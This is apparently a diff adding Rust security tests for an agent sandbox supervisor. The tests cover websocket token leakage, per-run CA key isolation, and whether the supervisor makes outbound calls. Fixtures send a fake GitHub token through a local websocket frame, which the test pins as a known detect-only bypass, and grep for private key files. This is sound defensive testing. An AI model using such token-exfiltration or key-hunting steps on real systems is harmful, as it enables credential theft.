+        let o = Origin::plain();
+        let p = o.port;
+        h.fixture("gh", FAKE_GH_TOKEN);
+        h.fixture(
+            "ws.py",
+            &format!(
+                r#"import socket
+tok = open(".fx/gh").read().strip().encode()
+def handshake(extra):
+    s = socket.create_connection(("127.0.0.1", 3128), timeout=10)
+    s.sendall(b"GET http://127.0.0.1:{p}/ws HTTP/1.1\r\nHost: 127.0.0.1:{p}\r\n"
+              b"Upgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Version: 13\r\n"
+              b"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n" + extra + b"\r\n")
+    buf = b""
+    while b"\r\n\r\n" not in buf:
+        d = s.recv(4096)
+        if not d:
+            break
+        buf += d
+    head, _, rest = buf.partition(b"\r\n\r\n")
+    return s, head.split(b"\r\n")[0].decode(), rest
+s, status, _ = handshake(b"Authorization: token " + tok + b"\r\n")
+print("secret-handshake:", status)
+s.close()
+s, status, rest = handshake(b"")
+print("handshake:", status)
+s.sendall(b"frame:" + tok + b"\n")
+while b"\n" not in rest:
+    d = s.recv(4096)
+    if not d:
+        break
+    rest += d
+print("echoed:", rest.startswith(b"frame:"))
+s.close()
+"#
+            ),
+        );
+        let policy = format!("[network]\nallow = [\"127.0.0.1:{p}\"]\nallow_private = true\n");
+        let l = h.run_logged(None, &policy, &["sh", "-c", "python3 .fx/ws.py"], &[]);
+        let text = l.text();
+        // The handshake is an HTTP request and is scanned like one.
+        assert!(text.contains("secret-handshake: HTTP/1.1 403"), "{text}");
+        assert!(text.contains("handshake: HTTP/1.1 101"), "{text}");
+        assert!(text.contains("echoed: True"), "{text}");
+        let req = l.at("net.request", p);
+        assert_eq!(req.len(), 1, "{}", l.raw);
+        assert_eq!(req[0]["status"], 101);
+        let tunnels = l.at("net.tunnel", p);
+        assert_eq!(tunnels.len(), 1, "{}", l.raw);
+        assert_eq!(tunnels[0]["protocol"], "upgrade");
+        assert_eq!(tunnels[0]["inspected"], false);
+        // Documented detect-only (N7): frames after the upgrade are not
+        // scanned, so the token in a frame arrives. Pinned deliberately.
+        let got = o.received();
+        assert!(got.contains(&format!("frame:{FAKE_GH_TOKEN}")), "{got}");
+        assert_eq!(
+            got.matches(FAKE_GH_TOKEN).count(),
+            1,
+            "handshake leaked:\n{got}"
+        );
+        l.assert_log_free_of(&[FAKE_GH_TOKEN]);
+    }
+
+    #[test]
+    fn n6_session_ca_is_per_run_and_its_key_never_reaches_the_sandbox() {
+        let Some(h) = harness("N6") else { return };
+        // Text files only: the agentkeep binary mounted for the shims
+        // contains the string as a DLP pattern. A fixture, not `sh -c`, so
+        // the pattern itself is not on the logged command line.
+        h.fixture(
+            "n6.sh",
+            "sed -n '/agentkeep session CA/,$p' \"$SSL_CERT_FILE\" | cksum | sed 's/^/ca:/'\ngrep -rlI -e '-----BEGIN [A-Z ]*PRIVATE KEY-----' /run/agentkeep /tmp \"$HOME\" 2>/dev/null | sed 's/^/KEYFILE /'\necho done\n",
+        );
+        let a = h.run_logged(None, "", &["sh", ".fx/n6.sh"], &[]);
+        let b = h.run_logged(None, "", &["sh", ".fx/n6.sh"], &[]);
+        let digest = |l: &Logged| {
+            l.text()
+                .lines()
+                .find(|x| x.starts_with("ca:"))
+                .unwrap_or_default()
+                .to_string()
+        };
+        let (da, db) = (digest(&a), digest(&b));
+        assert!(
+            !da.is_empty() && !da.ends_with(" 0"),
+            "no session CA in the bundle:\n{}",
+            a.text()
+        );
+        assert_ne!(da, db, "two sessions shared a CA");
+        for l in [&a, &b] {
+            assert!(l.text().contains("done"), "{}", l.text());
+            assert!(!l.text().contains("KEYFILE"), "{}", l.text());
+            assert!(!l.raw.contains("PRIVATE KEY"), "{}", l.raw);
+        }
+    }
+
+    // ---- S5: the supervisor itself -------------------------------------
+
+    #[test]
+    fn s5_supervisor_makes_no_outbound_connections() {
+        let Some(h) = harness("S5") else { return };
+        if !tools("S5", &["strace"]) {
+            return;
+        }
+        let trace = h.root.path().join("s5.trace");
+        let wrapper = strace(&trace, "connect,sendto,sendmsg,execve");
+        let wrapper: Vec<&str> = wrapper.iter().map(String::as_str).collect();
+        let o = h
+            .command(Some(&wrapper), "", &["true"], &[])
+            .output()
+            .expect("spawn strace");
+        assert!(o.status.success(), "{}", out(&o));
+        let trace = fs::read_to_string(&trace).unwrap();
+        // Non-vacuous: the trace followed the supervisor into the sandbox.
+        assert!(
+            trace
+                .lines()
+                .any(|l| l.contains("execve(") && l.contains("[\"true\"]")),
+            "strace did not reach the sandboxed command:\n{trace}"
+        );
+        let bad = outbound_attempts(&trace, &[]);
+        assert!(bad.is_empty(), "the supervisor reached out: {bad:#?}");
     }
 
     // ---- C: commands and processes ------------------------------------
